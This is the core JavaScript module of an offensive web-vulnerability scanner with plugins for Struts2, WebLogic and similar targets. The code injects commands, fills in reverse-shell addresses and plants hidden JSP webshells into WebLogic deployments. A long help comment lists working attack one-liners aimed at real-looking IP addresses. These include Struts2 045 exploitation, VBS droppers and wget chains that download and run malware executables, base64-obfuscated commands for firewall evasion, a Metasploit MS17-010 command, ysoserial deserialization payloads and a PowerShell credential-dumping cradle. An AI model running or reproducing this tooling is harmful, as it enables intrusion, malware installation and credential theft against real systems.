/* 2018-04-14 再次优化
1、基于对象模型
2、基于事件模型
 --trace-warnings --expose-gc
*/
var EventEmitter = require('events').EventEmitter,
	request = require('request'),
	child_process = require("child_process"),
	net = require('net'),
	config = require('../config.js'),
	levelup = require('levelup'),
	colors = require('colors'),
	moment = require('moment'),
	g_url = require('url'),
	urlObj = require('url'),
	md5 = require('md5'),
	util = require('util'),
	crypto = require('crypto'),
	async = require('async'),
	path = require("path"),
	fs = require('fs'),
	program = require('commander'),
	iconv = require("iconv-lite"),
	inherits = require('util').inherits,
	n_maxLs = 333;

// Object.deepExtend = function deepExtendFunction(destination, source) {
//   for (var property in source) {
//     if (source[property] && source[property].constructor &&
//      source[property].constructor === Object) {
//       destination[property] = destination[property] || {}; 
//       deepExtendFunction(destination[property], source[property]);
//     } else {
//       destination[property] = source[property];
//     }
//   }
//   return destination;
// };


EventEmitter.prototype._maxListeners = n_maxLs;
var _fnNull = function(e){if(program && program.verbose)console.log(e)};
process.on('uncaughtException', _fnNull);
process.on('unhandledRejection', _fnNull);

EventEmitter.defaultMaxListeners = n_maxLs;
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

/* 
X-XSS-Protection
X-Frame-Options
Expires: -1
Strict-Transport-Security: max-age=86400 

//////*/ 
// if(process && process.env)process.env.UV_THREADPOOL_SIZE = 128;
// fix: Hostname/IP doesn't match certificate's altnames
process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0;
function fnCheckUrl(url,oArgs)
{
	url || (url = null);
	function parseUrl(url)
	{
		var oU = g_url.parse(url);
		if(!oU.port)
		{
			if("https" == oU.protocol)oU.port = 443;
			else if("http" == oU.protocol)oU.port = 80;
		}
		return oU;
	};
	
	// 全局初始化的标志
	var _t = this, g_bInit = 0,
	    // bash -c {echo,ZWNobyB3aG9hbWk6O3dob2FtaTtlY2hvIHB3ZDo7cHdkO2VjaG8gY21kZW5k}|{base64,-d}|{bash,-i}
	    // echo ZWNobyB3aG9hbWk6O3dob2FtaTtlY2hvIHB3ZDo7cHdkO2VjaG8gY21kZW5k|base64 -d|sh
	    // echo whoami:;whoami;echo pwd:;pwd;echo cmdend
		g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;id;echo cmdend",
		g_szCmdW = "echo whoami:&& whoami && echo pwd:&& echo %cd% && echo cmdend";
	_t.g_szCmd = g_szCmd;
	_t.g_szCmdW = g_szCmdW;
	_t.levelup = levelup;
	_t.program = program;
	EventEmitter.call(_t);
  	// _t.setMaxListeners(Infinity);
  	_t.defaultMaxListeners = n_maxLs;
  	// _t.setMaxListeners(n_maxLs);
  	_t.setMaxListeners(_t.getMaxListeners() + 1);
  
	function getTimeCur()
	{
		return "[" + moment(new Date().getTime()).format('YYYY-MM-DD HH:mm:ss') + "] ";
	}
	_t.getTimeCur = getTimeCur;
	function fnClsHtml(s)
	{
		if(program.cmd)
		{
			var i = s.indexOf("<!DOCTYPE");
			if(-1 == i)i = s.indexOf("<html");
			if(-1 < i)
				s = s.substr(0,i);
			else s = s.replace(/<.*>/gmi,'');
			if(program.out && s)
			{
				fs.appendFileSync(_t.program.out,s + "\n");
			}
		}
		return s;
	}
	_t.fnClsHtml = fnClsHtml;
		// 异常消息显示
  	function error(e,t)
	{
		if(program.errors && e)
		{
			var stack =null;
			try{
			stack = new Error().stack			
			}catch(e){}
			if(stack)stack = stack.toString() + "\n" + e.toString(); 
			_t.emit('error',fnClsHtml(stack)||e,t,_t);
		}
	}
	
	// 日志
	function log(s)
	{
		if(program.verbose)
		_t.emit('log',_t.getTimeCur().bgBlue + fnClsHtml(s),_t);
	}
	// 日志
	function vulinfo(s)
	{
		_t.emit('vulinfo',_t.getTimeCur().red + s.bgYellow.red);
	}
	_t.vulinfo = vulinfo;
	// 日志
	function info(s)
	{
		if(program.verbose)
		_t.emit('info',_t.getTimeCur().bgGreen + fnClsHtml(s),_t);
	}
	
	// 初始化
  	function fnInit()
  	{
		// console.log(process.argv)
  		if(!global.bInit)
  		{
		  	program.version(_t.szMyName)
			.option('-u, --url [value]', 'check url, no default')
			.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default，设置代理')
			.option('-t, --t3 [value]', 'check weblogic t3,default false，对T3协议进行检测，可以指定文件名列表进行检测')
			.option('-i, --install', 'install node modules,run: npm install')
			.option('-v, --verbose', 'show logs')
			.option('-e, --errors', 'show logs')
			.option('-o, --out [value]', '--cmd,so out to fileanme ')
			.option('-w, --struts2 [value]', 'struts2 type,eg: 045')
			.option('-t, --tags [value]', 'tag type,eg: 045')
			.option('-C, --cmd [value]', 'cmd type,eg: "ping -c 3 www.baidu.com"')
			.option('-o, --timeout', 'default ' + _t.timeout)
			.option('-l, --pool', 'default ' + _t.g_nPool)
			.option('-r, --test', 'test')
			.option('-a, --list', 'display all plugins')
			.option('-x, --proxy', 'http://127.0.0.1:8800')
			.option('-m, --menu [value]', 'scan url + menus, default ./urls/ta3menu.txt')
			.option('-s, --webshell [value]', 'scan webshell url，设置参数才会运行, default ./urls/webshell.txt')
			.option('-d, --method [value]', 'default PUT,DELETE,OPTIONS,HEAD,PATCH test')
			.option('-a, --host ', 'host attack test,设置代理后该项功能可能无法使用,default true')
			.option('-k, --keys [value]', 'scan html keywords, default ./urls/keywords')
			.on('--help',_t.fnMyHelp)
			.parse(process.argv);
		}
		global.bInit = true;
		if(program.tags)program.struts2 = program.tags;
		program.url = url = _t.url = String(url || program.url).trim().replace(/[\s\r\n]*/gmi,'');
		// console.log(program)
		// console.log("url = " + url)
		if(url && !/null|undefined/gi.test(url))
		{
			// console.log(url)
			var oT1 = parseUrl(url) || {protocol:""};
			url = [oT1.protocol,"//", oT1.hostname,":", oT1.port || (-1 == oT1.protocol.indexOf("https")?80:443),oT1.path].join("")
			// console.log(url)
			// 修正没有http的情况
			if(-1 == url.indexOf("://"))
			{
				url = _t.url = "http://" + url;
			}
			if(-1 == url.indexOf("/",12))
			{
				url = _t.url = url + "/";
			}
		}
		var sPath = __dirname + "/../data/" + moment(new Date().getTime()).format('YYYY-MM-DD');
		_t.rstPath = sPath;
		_t.child_process = child_process;
		if(!fs.existsSync(sPath))
			fs.mkdirSync(sPath);
		var szEp = _t.szErrorPath;
		if(!_t.g_szError)
		{
			if(fs.existsSync(szEp))
				_t.g_szError = fs.readFileSync(szEp);
		}
		if(_t.program.cmd)g_szCmdW = _t.g_szCmdW = g_szCmd = _t.g_szCmd = _t.program.cmd,_t.program.verbose=true;
		_t.emit('init');
	}

	// 数据拷贝
	function copyO2O(oS,oD)
	{
		for(var k in oS)
		{
			oD[k] = oS[k];
			fnCheckUrl.prototype[k] = oS[k];
		}
		return oD;
	};

	// 装饰request的post、get方法，便于统一获得异常、body数据
	function fnRequestWraper(opt,fnCbk,_f)
	{
		;
	}

	// 获取一个包装后的请求对象，包含设置代理后的
	// 优先使用系统环境变量中的代理，如果设置了，则覆盖系统代理
	function fnGetRequest(req,opt)
	{
		var _req = req, s = program && program.proxy || process.env["HTTP_PROXY"] || '',option = 
			{
				// hack ESOCKETTIMEDOUT,https://stackoverflow.com/questions/35387264/node-js-request-module-getting-etimedout-and-esockettimedout/37946399#37946399
				agent: false, pool: {maxSockets: 200},
				'timeout':_t.timeout||2000,
				'maxSockets':n_maxLs,
				maxRedirects:10,
				agentOptions: {
			      rejectUnauthorized: false
			    },
				// localAddress:'192.168.24.1',// 指定网卡Local interface to bind for network connections when issuing the request
				rejectUnauthorized:false,
				removeRefererHeader:false,
				followRedirect:true,     // follow HTTP 3xx responses as redirects (default: true).
				followAllRedirects:false,// follow non-GET HTTP 3xx responses as redirects (default: false)
				'headers':{'connection':'close'}
			};
		if(opt)
		{
			for(var k in opt)option[k] = opt[k];
		}
		// process.env["HTTP_PROXY"] = "http://127.0.0.1:8880";
		if(s)option['proxy'] = s,log("当前代理：" + s);
		
		/*/ 给request的异常，返回统一捕获
		var _tFn = function(opt,fnCbk)
		{
			var _this = this;
			EventEmitter.call(_this);
			return _req(opt,function(e,r,b)
			{
				if(e)_t.error(e + ": " + _this.url,'request');
				if(fnCbk)return fnCbk(e,r,b);
			});
		}
		inherits(_tFn, req);
		var ko = req.prototype;
		for(var k in ko)
			_tFn.prototype[k] = ko[k];
		for(var k in req)
			_tFn[k] = req[k];
		
		_req = _tFn.defaults(_t.reqOption = option);
		/////////////*/
		_req = req.defaults(_t.reqOption = option);
		// _req.on('error', function(err)
		// {
		//     _t.error(err,'request');
		// });
		return _req;
	};
	request = fnGetRequest(request);
	// var aT1 = "post,get".split(",");

	_t.request = request;
	_t.error = error,
	_t.log = log,
	_t.fnInit = fnInit,
	_t.fnGetRequest = fnGetRequest,
	_t.copyO2O = copyO2O;
	_t.program = program;
	_t.async = async;
	_t.moment = moment;
	_t.fs = fs;
	_t.config = config;
	_t.info = info;
	_t.md5 = md5;
	// payload 加载、处理
	var formatPayload=function(s,sI)
	{
		var szX11 = sI;
	   if(fs.existsSync(sI))
	   	    szX11 = fs.readFileSync(sI).toString("utf-8");
	   
	   s = s.replace(/\{code\}/gmi, szX11);
	   if(config.reverShell)
	   s = s.replace(/\{reverShell.ip\}/gmi, config.reverShell.ip),
	   s = s.replace(/\{reverShell.port\}/gmi, config.reverShell.port);

	   return s;
	};
	_t.formatPayload = formatPayload;


	// linux下，正对weblogic，bash复制webshell到所有war下
	_t.getX11_linuxShell = function(s1_)
	{
		var oTmp1 = _t.fs.readFileSync(__dirname + "/../payload/x.jsp");
		
		 var szJspName = ".O0"+ new Date().getTime() + ".jsp",
			szCode = //fs.readFileSync("payload/clearHis.sh").toString("utf-8") +
			"#!/bin/bash\nB64Jsp=\""+ oTmp1.toString("base64") + "\"\n" +
			_t.fs.readFileSync(__dirname + "/../payload/linuxShellX11.sh").toString("utf-8") +
			// fs.readFileSync("payload/end.sh").toString("utf-8") + 
			// linux反弹shell
			// formatPayload("{code}","payload/linuxPyReverse.sh"),
			"",
			// _s.fs.readFileSync("payload/linuxPyReverse.sh").toString("utf-8"),
			sTmp1 = Buffer.from(szCode.replace(/\.X11\.jsp/gmi, szJspName)).toString("base64").replace(/[\r\n]/gmi,'');
			// console.log(szCode);
			// 处理、解决bash -c 不支持变量的问题
			var szTmpFN = "./._t_",s1_1 = formatPayload(s1_, "echo " + sTmp1 + "|base64 -d>" + szTmpFN + ";. " + szTmpFN + ";rm -rf " + szTmpFN);
			return {c:s1_1,j:szJspName}
	};

	// 定义全局变量
	copyO2O({
		szMyName:'M.T.X._2017-06-08 1.0',
		g_oRstAll:{},// 结果差分比较
		g_szMyMsg:"我有我有一键修复、且零入侵(不修改一行代码)的方案，价格2000美金，你要吗？赶紧拿起你的电话，call me",
		g_szSplit:/[,;\s\|]/gmi,
		g_host2Ip:{},// 域名到ip转换缓存
		g_nThread:5,// 并发线程数
		g_szUrl:"",
		bReDo:false, 
		szLstLocation:"",
		g_oRst:{},
		timeout:5000,
		g_nPool:300,
		bRunHost:false,
		g_szUa:"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110",
		aHS:"X-Content-Type-Options,content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),		
	// 获取ip信息
	getIps:function(ip)
	{
		var re = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/gmi.exec(ip);
		if(re && 0 < re.length)ip = re[1];
		request.get("http://ipinfo.io/" + ip,function(e,r,b)
		{
			try{if(!e)_t.g_oRst["ipinfo"] = JSON.parse(b);}catch(e1){_t.error(e1)}
		});

	},// leaks info check
	checkLeaks:function(s)
	{
		;
	},// 解析裸头信息
	fnParseHttpHd:function(s,fnCbk)
	{
		var a = String(s).trim().split(/\n/), obj = {"statusCode":a[0].split(/ /)[1]};
		// if(!(/^\d+$/.test(obj.statusCode))) obj['body'] = s.trim().replace(/[\r\n\t]/gmi, "").replace(/>\s*</gmi, "><");

		for(var i in a)
		{
			// if(0 == i)continue;
			var x = a[i].indexOf(":");
			var aT = [a[i].substr(0, x), a[i].substr(x + 1)];
			
			if(aT[0])obj[String(aT[0]).toLowerCase().trim()] = String(aT[1]).trim();
		}
		if(fnCbk)fnCbk(obj);
	},
	fnShowBody:function(s)
	{
		if(_t.program.cmd && s)
		{
			_t.log(s.replace(/<[^>*]>/gim,''));
		}
	},
	/* 能差分获取结果
	1、运行一次命令：echo xxxMTXxxx
	2、从返回结果中找到，并记录位置，和url关联，后期所有命令的返回都用相同的长度来判断
	3、判断后没有结果，则返回所有的内容，让人工自行判断，可以通过标志关闭人工判断
	*/
	fnCfRst:function(url,s,oRst)
	{

		var oGra = g_oRstAll || _t.g_oRstAll,
		    o = oRst && oRst[url] && oRst[url].body || oGra[url] && oGra[url].body,
		    x = 0,y;

		if(!o)
		{
			// console.log("没有找到。。" + url);
			// console.log(oRst);
			return s;
		}
		var i = o.split(),j = s.split();
		y = j.length;
		for(var e = 0; e < i.length;e++)
		{
			if(e >= y)break;
			if(i[e] == j[e])x = e;
			else break;
		}
		
		var yy = 0;
		for(var e = i.length - 1; 0 < e;e--)
		{
			if(0 >= j.length - yy)break;
			if(i[e] == j[j.length - yy - 1])y = j.length - yy;
			else break;
		}
		// console.log("[[x = [" + x + "]][[y = [" + y + "]]" + j.length);
		if(1 < y -x)return s.substr(x,y);
		return s;
	},
	// 解析url
	"parseUrl":parseUrl,
	tmClose:function(o,t)
	{
		return setTimeout(function()
		{
			try{if(o)(o['end'] || o['destroy']|| o['close']||function(){})();}catch(e){}
		},t);
	},
	g_szError:'',
	szErrorPath: __dirname + "/../data/errorUrl.txt",
	/* 基于socket发送数据
	h 主机host,只能是ip
	p 端口port
	szSend send data
	*/
	fnSocket:function(h,p,szSend,fnCbk)
	{
		if(null == p) p = 80;
		_t.info(["fnSocket", h,p,szSend]);
		var sKey = [h,p,szSend].join(":");
		// 避免多次执行
		global.g_mysocket || (global.g_mysocket={});
		global.g_mySktFlg || (global.g_mySktFlg={});
		if(global.g_mySktFlg[sKey])return;
		global.g_mySktFlg[sKey] = true;
		if(global.g_mysocket[sKey])
		{
			fnCbk(global.g_mysocket[sKey]);
			return;
		}
		// if(-1 < _t.g_szError.indexOf(url))
		// {
		// 	_t.info("跳过，曾经发生过异常：" + url);
		// 	return fnCbk('');
		// }
		var s, rIp = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d+)?/gmi,
			g_host2Ip = _t.g_host2Ip;
		try{
			if(h && !(s = rIp.exec(h)))
			{
				if(g_host2Ip[h])h = g_host2Ip[h];
				else
				{
					try{
						s = child_process.execSync("ping -c 1 -t 1 " + h + " 2>&1");
					}catch(e1)
					{
						if(e1)s = String(e1.stdout||e1.stderr)||"";
					}
					s = rIp.exec(s);
					if(s)g_host2Ip[h] = s[0],h = s[0];
				}
			}
			
			var oTmp = _t.fnOptHeader({"port": p,"host":h});
			oTmp.timeout = 15000;
			var nClear = 0;
			_t.info("开始net.connect连接: " + h + ":" + p + " send length: " + sKey.length);
			var client = net.createConnection(oTmp, () => 
			{
				// _t.info("连接成功: " + h + ":" + p);
			  	client.write(szSend + '\n\n\n\n');
			    // _t.info("发送完数据: " + h + ":" + p + "\n" + szSend);
			    client.end();
			});
			client.setTimeout(oTmp.timeout);
			client.on('timeout',function()
			{
				_t.error("fnSocket timeout");
				if(client && client.end)client.end();//  client.destroy();
			});
			client.on('error', function(err) {
			  if (err.code === 'ETIMEDOUT') {
				  _t.error(err);
			  }
			  client.end();
			});
			var aData = [];
			client.on('data', (data) => 
			{
				aData.push(data.toString());
				// if(fnCbk)fnCbk(global.g_mysocket[sKey] = data);
				client.end();
				// _t.info("收到数据: " + h + ":" + p + "\n" + data.toString());
			});
			client.on('end', () =>
			{
				// 清除延时，避免多次调用end
				if(nClear)clearTimeout(nClear);
				_t.info("关闭连接: " + h + ":" + p + " send length: " + sKey.length);
				
				if(fnCbk)fnCbk(global.g_mysocket[sKey] = aData.join(''));
				// fixed: TypeError: Cannot read property '_writableState' of undefined
				// client.destroy = client.close = client.end = null,
				client = null;
			});
			// 有可能执行到这里已经end过了
			if(client)nClear = _t.tmClose(client,oTmp && oTmp.timeout||2000);
		}catch(e)
		{
			// console.log(e);
			_t.g_szError += url + "\n";
			// fs.writeFileSync(_t.szErrorPath, _t.g_szError);
			_t.error(e,'fnSocket')
		}
	},
	g_oAllPlugins:{},// 所有插件加载后的缓存
	// 获取插件
	fnGetPlugIn:function(s)
	{
		var o,a = [],oT = {},
		 	g_oAllPlugins = _t.g_oAllPlugins;
		for(var k in g_oAllPlugins)
		{
			o = g_oAllPlugins[k];
			if(o.fnCheckTags(s))
			{
				if(!oT[o.tags])// 避免重复
				a.push(o),oT[o.tags] = 1;
			}
		}
		return 0 < a.length ? a : null;
	},
	bReady:false,
	// 避免重复
	g_oNorepeat:{},
	blistPlugs:false,
	listPlugs:function()
	{
		if(program.list && !_t.blistPlugs)
		{
			_t.blistPlugs = true;
			var a = global.g_myPlugs,i = 0;
			
			console.log(['','name','tags','dependencies','des',''].join("|") + "\n| --- | ---  | ---  | --- |");
			 for(var k in a)
			 {
				 if(/(report|request)/gmi.test(k))continue;
				console.log(['',k.substr(__dirname.length),a[k].tags,a[k].dependencies ||'',a[k].des,''].join("|"));
			 }
			// for(; i < a.length; i++)
			// {
			// 	console.log(a[i].tags);
			// }
		}
	},
	/* 
	1、通过关键词找到可用插件
	2、自动运行可用插件
	*/
	runChecks:function(url,szTags,fnCbk,parms)
	{
		if(!url || -1< url.indexOf('undefined'))
		{
			// console.log(url + " url is undefined")
			return;
		}
		// console.log(url + " url not undefined")
		if(!url)
		{
			// program.help();
			_t.fnMyHelp();
			// process.exit(0);
			return;
		}
		// 避免相同url 在相同的插件中多次运行
		global.g_noRepeat || (global.g_noRepeat = {});
		if(_t.g_oNorepeat[url])
		{
			_t.log("0、已经执行过、跳过：" + url);
			return fnCbk && fnCbk() || '';
		}
		_t.g_oNorepeat[url] = 1;
		fnCbk||(fnCbk = _t.fnReport);
		// _t.info("in runChecks: " + url);
		var g_oForm = _t.g_oForm,bRt = false,fnT = function()
		{
			_t.bReady = true;
			
			var a = _t.fnGetPlugIn(szTags);
			if(a)
			{
				_t.info("start runChecks: " + a.length);
				var nPls = a.length;
				for(var k in a)
				{
					// 曾经发生过异常的页面
					if(-1 < _t.g_szError.indexOf(url))
					{
						if(!bRt)bRt=true,_t.emit('over');
						_t.info('1、跳过，曾经发生过异常: ' + url);
						return fnCbk(null,null,0);
					}
					var o = a[k];
					try{
						if(!g_oForm[o.url + o.tags])
						{
							if(!global.g_noRepeat[url+o.tags])//_t.info("start " + o.tags + ": " + url),
							// console.log(o.tags),
							global.g_noRepeat[url+o.tags]=1,o.doCheck(url,function(o9,_t1)
							{
								if(_t1 && o9)g_oForm[o9.url + _t1.tags] = 1;
								// 便于差分比较结果
								// g_oRstAll[o9.url] = o9;
								fnCbk(o9,_t1,--nPls);
								if(0 == nPls && !bRt)
									bRt = true,_t.emit('over');
							},parms);
						else _t.info("2、似乎已经执行过了" + url);
						}
						else _t.info("3、似乎已经执行过了" + url);
					}catch(e){_t.error(e,'runChecks',url,szTags)}
				}
			}
			else info('4、没有找到任何插件：' + szTags);
		};
		if(_t.bReady)fnT();
		else _t.on('ready',fnT);
	},fnReport:function(o,_t1)
	{
		var o1 = _t.fnGetPlugIn("report");
		if(o1)
		{
			for(var k in o1)
				o1[k].doCheck(o,_t1);
		}
	},
	fnHelp:function(){
	/*
	tomcat Put test
	Struts2_001
	Struts2_005
	Struts2_007
	Struts2_008
	Struts2_009
	Struts2_012
	Struts2_013
	Struts2_015
	Struts2_016
	Struts2_019
	Struts2_020
	Struts2_029
	Struts2_032
	Struts2_033
	Struts2_037
	Struts2_DevMode
	Struts2_045
	Struts2_046
	Struts2_048
	Struts2_053
	elasticsearch
	伪造host等检测

	node checkUrl.js -u http://192.168.10.216:8082/s2-032/ --struts2 045

py2 /root/mytools/myhktools/tools/expOracle.py xx/xx@12.18.101.5/xxx

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Red5AMF3 JdbcRowSet 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:8080/15_8099.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

./msfconsole -qx 'handler -P 4444 -p windows/x64/meterpreter/bind_tcp -H 192.168.69.140; sleep 5; route add 192.168.69.128 255.255.255.255 1; use exploit/windows/smb/ms17_010_psexec; set RHOST 192.168.69.128; set PAYLOAD windows/x64/meterpreter/bind_tcp; set SMBUser USERNAME; set SMBPass PASSWORD; run; exit -y'
	# 利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
	# cd myhktools/jars;python -m SimpleHTTPServer 8080
	node checkUrl.js -u http://92.68.0.5:8080/PortalServer/customize/defaultZh/auth.jsp --struts2 045 --cmd 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:8080/15_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

	cd myhktools/jars;java -jar jfxl.jar xxx.x.xx.xx:xxx -i
	pwd
	put myhktools/bin/run.sh
	/home/weblogic/Oracle/Middleware/user_projects/domains/domain/run.sh 

	node checkUrl.js -u http://19.6.4.19:8122/login.jsp --struts2 045 --cmd 'x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &'

	x=Lover1234_65.exe; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x};

	cmd.exe /c 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'


	java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.RMIRegistryExploit 192.168.24.10 7777 CommonsCollections1 cmd.exe /c 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

	java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3 C3P0WrapperConnPool
	gadget type specified, available are [UnicastRef, SpringPropertyPathFactory, C3P0WrapperConnPool]

	IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/Powershell-Modules/master/Get-MSSQLCredentialPasswords.psm1"); Get-MSSQLCredentialPasswords

	node checkUrl.js -u http://119.6.84.189:8122/login.jsp --struts2 045 --cmd 'echo "eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo="|base64 -D|sh'

	绕过防火墙、执行命令，避免引号等在注入攻击时失效
	思路：
	对执行的命令串编码，base64，运行时解码再执行，例如：
	echo 'eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo='|base64 -D|sh

	x=linuxRvsTcp123.elf; wget --header='User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' http://23.105.209.65/linuxRvsTcp123.elf; chmod +x linuxRvsTcp123.elf; ./${x} &

	# 生成远程反弹payload
	java -jar ./ysoserial-master-v0.0.5-gb617b7b-16.jar  C3P0 '@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

